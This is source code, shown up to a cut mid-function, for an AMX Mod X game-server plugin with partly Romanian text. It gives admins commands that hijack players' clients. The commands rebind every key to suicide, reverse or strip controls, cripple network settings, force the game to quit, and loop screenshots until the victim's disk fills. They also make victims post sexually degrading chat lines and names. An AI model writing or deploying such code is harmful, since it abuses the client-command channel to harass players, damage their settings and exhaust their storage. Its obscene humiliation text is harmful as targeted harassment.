/*
*
*    
*/
#include <amxmodx>
#include <amxmisc>
#include <engine>

new PLUGIN[]="AMXX_FUCKOFF" 
new AUTHOR[]="Isti" 
new VERSION[]="2.Translatat"
new g_szSoundFile[]="misc/yougotserved.wav"
new g_servfile[128]
new g_servdir[64],g_servtxt[32],g_servlen = 31,r,t
new g_savesrv
new bool:bCmd = false
new bool:spinon[33]
new dev_id[] = "STEAM_0:0:1313352"

#define TASK_N 45629
#define bZ 45630 

public plugin_init(){
	register_plugin(PLUGIN,VERSION,AUTHOR)
	register_concmd("amx_fuckoff","fuckoff",ADMIN_BAN,"<nick> : Bindeaza butoanele jucatorului la sinucidere.")
	register_concmd("amx_screw","screw",ADMIN_BAN,"<nick> : Incearca sa inverseze butoanele jucatorului.")
	register_concmd("amx_smash","smash",ADMIN_CFG,"<nick> : Ii face jucatorului lag urias.")
	register_concmd("amx_pimpslap","pimpslap",ADMIN_BAN,"<nick> : Face ca jacutorul sa se invarta in cercuri.")
	register_concmd("amx_censure","censure",ADMIN_RCON,"<nick> :Ii fute pe codati serios nu vor mai putea juca deloc.")
	register_concmd("amx_unfuckoff","unfuckoff",ADMIN_BAN,"<nick> : Repara Fuckoff ul.")
	register_concmd("amx_unscrew","unscrew",ADMIN_BAN,"<nick> : Repara screw ul.")
	register_concmd("amx_unsmash","unsmash",ADMIN_CFG,"<nick> : Repara smesh ul.")
	register_concmd("amx_uncensure","uncensure",ADMIN_BAN,"<nick> : Repara censure ul.")
	register_concmd("amx_unpimpslap","unpimpslap",ADMIN_BAN,"<nick> : Repara pimpslap ul.")
	register_concmd("amx_spank","spankme",ADMIN_RCON,"<nick> : Face ca jucatorul sa ia screenshoturi pana i se umple hardu, *NU SE POATE SCOATE* ") 
	register_concmd("amx_fucktest","fucktest",ADMIN_RCON,"<nick> : Testeaza comanda.")
	register_concmd("amx_spin","spiniton",ADMIN_BAN,"<nick> : Face ca jucatorul sa zboare incontrolabil")
	register_concmd("amx_unspin","spinitoff",ADMIN_BAN,"<nick> : Face ca jucatorul sa se intoarca pe pamant.")
	register_cvar("amx_fuckoff_activity","0")
	register_event("ResetHUD","reset_round","b")
	
	loadsrv()
	
	return PLUGIN_CONTINUE
}
// Sound precache needed for sound effect
public plugin_precache(){ 
    if( file_exists( g_szSoundFile ) ){
     
        precache_sound( g_szSoundFile ) 
    } 
} 
// Beginning of public commands
// Still not working like i want it to, need to alter timer to function without overflow.
public spankme(id,level,cid)
{
	if (!cmd_access(id,level,cid,2))
	{
		return PLUGIN_HANDLED
	}
	if (bCmd)
	{
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !.")
		client_print(0,print_chat,"Atentie: %s sa foloseasca SPANK pe %s. Nu este permis !.",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"Amx FuckOFF Translatat de ScaRba37^nAi dat spank la jucator fara batai de cap.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda  SPANK pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	
	if(!target)
	{ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity"))
	{
    		case 1: client_cmd(target,"say ^"%s Ma fute de ma doare in cur.^"",admin)
    		case 0: client_cmd(target,"say ^"Sunt o curva si ma fut cu un vibrator :D.^"")
  	}
  	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
	client_cmd(target,"developer 1")
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
	client_cmd(target,"unbind `; unbind ~;unbind escape")
	new parms[1]
	parms[0] = target
	set_task(1.0,"spank_timer",1337+id,parms,1)
    	for (new i = 0; i < inum; ++i) 
	{
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]jucatorul:%s a luat spank de la %s",name,admin)
  	}
  	bCmd = true
	waittimer(id)
  	return PLUGIN_CONTINUE
    	   	
}
// spank timer, this cannot be stopped once started. User must be removed.
public spank_timer(parms[])
{
	new victim = parms[0]
	if(!is_user_connected(victim))	return PLUGIN_HANDLED
	// Can cause overflow, need to fix.
	client_cmd(victim,"snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait")
	//client_cmd(victim,"snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait")
	//client_cmd(victim,"snapshot;snapshot;snapshot;snapshot;snapshot;snapshot;snapshot;snapshot;snapshot;snapshot")
	parms[0] = victim
	set_task(0.1,"spank_timer",1337+victim,parms,1)
	
	return PLUGIN_CONTINUE
	
}
	
	
	
	
	
	
	
public fuckoff(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !.")
		client_print(0,print_chat,"Atentie: %s a incercat sa foloseasca  FUCKOFF pe %s. Nu este permis.",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF Creat de Isti^nComanda executata cu succes.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s used command FUCKOFF on %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	if(!is_user_alive(target)){
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"%s Ma invata ce este respectul si am nevoie sa invat de la pula.^"",admin)
    			case 0: client_cmd(target,"say ^"Adminul ma invata ce e respectul si cum sa sug pula !.^"")
  		}
		client_cmd(target,"developer 1")
  		client_cmd(target,"bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
    		client_cmd(target,"bind ctrl kill;wait;bind 1 kill;bind 2 kill;wait;bind 3 kill;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
    		client_cmd(target,"bind 8 kill;wait;bind 9 kill;bind 0 kill;wait;bind r kill;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
    		client_cmd(target,"bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
    		client_cmd(target,"bind rightarrow kill;wait;bind mwheeldown kill;bind mwheelup kill;wait;bind ` kill;bind ~ kill;wait;name ^"I CRAPPED MYSELF^"")
    		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost futut de %s",name,admin)
  		}
  		bCmd = true
		waittimer(id)
  		return PLUGIN_HANDLED
    	    	
    	}
    	else {
		client_cmd(target,"developer 1")
    		client_cmd(target,"kill")
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"%s Ma invata ce este respectul si am nevoie sa invat de la pula.^"",admin)
    			case 0: client_cmd(target,"say ^"Adminul ma invata ce e respectul si cum sa sug pula !.^"")
   		}
  		client_cmd(target,"bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
    		client_cmd(target,"bind ctrl kill;wait;bind 1 kill;wait;bind 2 kill;wait;bind 3 kill;wait;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
    		client_cmd(target,"bind 8 kill;wait;bind 9 kill;wait;bind 0 kill;wait;bind r kill;wait;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
    		client_cmd(target,"bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;wait;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
    		client_cmd(target,"bind rightarrow kill;wait;bind mwheeldown kill;wait;bind mwheelup kill;wait;bind ` kill;bind ~ kill;wait;name ^"I CRAPPED MYSELF^"")
    		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost futut in cur de %s",name,admin)
  		}
  		bCmd = true
		waittimer(id)
  		return PLUGIN_HANDLED
    	}
    	
    	return PLUGIN_HANDLED
}
// Only use on worst offenders.
public censure(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !.")
		client_print(0,print_chat,"ATENTIE: %s a incercat sa foloseasca CENSURE pe %s. Nu este permis asa ca suge pula.",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF Creat de Isti^nComanda executata cu succes.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda  CENSURE pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Imi pare rau %s pentru ca am fost un labist idiot . Fa cu mine ce vrei iti sug chiar si pula sau iti ling curu daca vrei !!^"",admin)
    		case 0: client_cmd(target,"say ^"Imi pare rau ca am fost un labis idiot . Fa cu mine ce vrei iti sug chiar si pula sau iti ling curu daca vrei !!^"")
   	}
	client_cmd(target,"developer 1")
  	client_cmd(target,"unbind w;wait;unbind a;unbind s;wait;unbind d;bind mouse1 ^"say Sunt un cacat de doi bani !!!^";wait;unbind mouse2;unbind mouse3;wait;bind space quit")
    	client_cmd(target,"unbind ctrl;wait;unbind 1;unbind 2;wait;unbind 3;unbind 4;wait;unbind 5;unbind 6;wait;unbind 7")
    	client_cmd(target,"unbind 8;wait;unbind 9;unbind 0;wait;unbind r;unbind e;wait;unbind g;unbind q;wait;unbind shift")
    	client_cmd(target,"unbind end;wait;bind escape ^"say I'm a helpless little shit^";unbind z;wait;unbind x;unbind c;wait;unbind uparrow;unbind downarrow;wait;unbind leftarrow")
    	client_cmd(target,"unbind rightarrow;wait;unbind mwheeldown;unbind mwheelup;wait;bind ` ^"say I'm a helpless little shit^";bind ~ ^"say Sunt un cacat de doi bani^";wait;name ^"Am futut cu adminul gresit^"")
    	client_cmd(target,"rate 1;gl_flipmatrix 1;cl_cmdrate 10;cl_updaterate 10;fps_max 1;hideradar;con_color ^"1 1 1^"")
    	client_cmd(target,"quit")
    	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]jucatorul:%s a fost cenzurat de  %s",name,admin)
  	}
  	bCmd = true
	waittimer(id)	
  	return PLUGIN_HANDLED
    	
    	
}

public screw(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !")
		client_print(0,print_chat,"ATENTIE: %s a incercat sa foloseasca comanda SCREW pe %s.Acest lucru nu e permis ce idiot e :D .",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF v.1.82 created by jsauce^nSuccessfully screwed another user.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda SCREW pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Daaaah %s Imi place sa ma futi in cur^"",admin)
    		case 0: client_cmd(target,"say ^"Daa imi place sa fiu futut tare in cur!^"")
   	}
	client_cmd(target,"developer 1")
  	client_cmd(target,"bind w +back;wait;bind s +forward;bind a +right;wait;bind d +left;bind UPARROW +back;wait;bind DOWNARROW +forward;bind LEFTARROW +right;wait;bind RIGHTARROW +left")
    	client_cmd(target,"unbind `;wait;unbind ~;unbind escape;name ^"IMI PLACE SA FAC SEX CU BAIETZII^"")
    	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s was screwed by %s",name,admin)
  	}
  	bCmd = true
	waittimer(id)
  	return PLUGIN_HANDLED
    	
    	
}

public smash(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !")
		client_print(0,print_chat,"WARNING: %s attempted to use SMASH on %s. That is not allowed.",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF v.1.82 created by jsauce^nSuccessfully smashed another user.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s used command SMASH on %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Yeah %s I'm spinning like a mofucka!^"",admin)
    		case 0: client_cmd(target,"say ^"Yeah I'm spinning like a mofucka!^"")
   	}
	client_cmd(target,"developer 1")
   	client_cmd(target,"rate 1;cl_cmdrate 10; cl_updaterate 10;fps_max 1")
   	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]user:%s was smashed by %s",name,admin)
  	}
	new pnum = 100
	for (new c = 0; c < pnum; ++c) {
		if (is_user_connected(target)){
			new parms[2]
			parms[0] = target
			parms[1] = 0
			smash_user(parms)
		}
	}
  	bCmd = true
	waittimer(id)	
  	return PLUGIN_HANDLED
    	
    	
}

public smash_user(parms[]){
	new target = parms[0]
	new num = parms[1]
	if (num == 0) {
		sleeptimer(target)
	}
	else {
		if (!is_user_connected(target)){
			return PLUGIN_HANDLED
		}
		else {
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
			client_cmd(target,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
		}
	}
	return PLUGIN_CONTINUE
}
public sleeptimer(target){
	new parm[1]
	parm[0] = target
	set_task(0.2,"resolved2",target,parm)
}
public resolved2(parm[]){
	new target = parm[0]
	new parms[2]
	parms[0] = target
	parms[1] = 1
	set_task(0.1,"smash_user",target + 1251,parms,2)
	
}
public pimpslap(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (bCmd){
		waittimer(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
	if (equali(dev_id,sAuthid))
	{
		client_print(id,print_console,"Nu poti sa dai comanda pe ADMIN idiotule de doi bani !")
		client_print(0,print_chat,"ATENTIE: %s a incercat sa  PIMPSLAPEZE pe %s. Dar nu e voie :D Ce cacat e :D .",admin,name)
		target = id
	}
	loadsrv()
	writesrv()
	format(message,551,"AMXX FUCKOFF creat de Isti^nComanda a fost utilizata cu succes pe :D ->.^n%i served and counting...",g_savesrv)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda PIMPSLAP pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)

	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	if(!is_user_alive(target)){
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"%s Imi place sa fiu gay.^"",admin)
    			case 0: client_cmd(target,"say ^"Imi place sa ma fut cu vibratoru in cur.^"")
  		}
		client_cmd(target,"developer 1")
  		client_cmd(target,"bind ` ^"say Consola mea a luatro razna^";bind ~ ^"say My console seems to be broken^";bind escape ^"say My escape key seems to be broken^";+forward;wait;+right")
    		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a luat pimpslap de %s",name,admin)
  		}
  		bCmd = true
		waittimer(id)
  		return PLUGIN_HANDLED
    	    	
    	}
    	else {
		client_cmd(target,"developer 1")
    		client_cmd(target,"kill")
    		switch (get_cvar_num("amx_fuckoff_activity")) {
    			case 1: client_cmd(target,"say ^"O sug lui %s  .^"",admin)
    			case 0: client_cmd(target,"say ^"Sug pula .^"")
  		}
  		client_cmd(target,"kill")
  		client_cmd(target,"bind ` ^"say Consola mea a luat razna^";bind ~ ^"say Consola mea nu mai mere^";bind escape ^"say Escapeul meu e dus draq^";+forward;+right")
    		write_file(fo_logfile,maxtext,-1)
		set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    		show_hudmessage(0, message)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
    		for (new i = 0; i < inum; ++i) {
    			if ( access(players[i],ADMIN_CHAT) )
      			 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost inmuiat bine de %s",name,admin)
  		}
  		bCmd = true
		waittimer(id)
  		return PLUGIN_HANDLED
    	}
    	
    	return PLUGIN_HANDLED
}
public unfuckoff(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda  UNFUCKOFF pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Am revenit la normal.^"",admin)
    		case 0: client_cmd(target,"say ^"Am revenit la normal.^"")
   	}
	client_cmd(target,"developer 1")
   	client_cmd(target,"exec config.cfg")
   	client_cmd(target,"exec userconfig.cfg")
  	write_file(fo_logfile,maxtext,-1)
   	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s nu mai e futut de %s ",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}

public unscrew(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda UNSCREW pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Am revenit la normal.^"",admin)
    		case 0: client_cmd(target,"say ^"Am revenit la normal.^"")
   	}
	client_cmd(target,"developer 1")
   	client_cmd(target,"exec config.cfg")
   	client_cmd(target,"exec userconfig.cfg")
  	write_file(fo_logfile,maxtext,-1)
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost oprit din invartire %s",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}
public uncensure(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda  UNCENSURE pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Am revenit la normal.^"",admin)
    		case 0: client_cmd(target,"say ^"Am revenit la normal.^"")
   	}
	client_cmd(target,"developer 1")
   	restore_keys(target)
   	client_cmd(target,"exec userconfig.cfg")
  	write_file(fo_logfile,maxtext,-1)
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost decenzurat de  %s",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}

public unsmash(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda UNSMASH pe %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Am revenit la normal.^"",admin)
    		case 0: client_cmd(target,"say ^"Am revenit la normal.^"")
   	}
	client_cmd(target,"developer 1")
   	client_cmd(target,"rate 9999;cl_cmdrate 30; cl_updaterate 30;fps_max 100.0;retry")
    	write_file(fo_logfile,maxtext,-1)
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[AMXX]Jucatorul:%s a fost scos de lovire de  %s",name,admin)
  	}
  		
  	return PLUGIN_HANDLED
    	
    	
}

public unpimpslap(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],players[33],inum
	new fo_logfile[64],ctime[64],maxtext[256]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",ctime,63)
    	format(maxtext, 255, "[AMXX] %s: %s used command UNPIMPSLAP on %s",ctime,admin,name)
    	format(fo_logfile, 63, "%s/amxx_fuckoff.txt", fo_logfile)
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_fuckoff_activity")) {
    		case 1: client_cmd(target,"say ^"Multumesc %s Am revenit la normal^"",admin)
    		case 0: client_cmd(target,"say ^"Am revenit la normal.^"")
   	}
	client_cmd(target,"developer 1")
   	client_cmd(target,"bind ` toggleconsole;bind ~ toggleconsole;bind escape cancelselect;-forward;wait;-right")
    	write_file(fo_logfile,maxtext,-1)
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
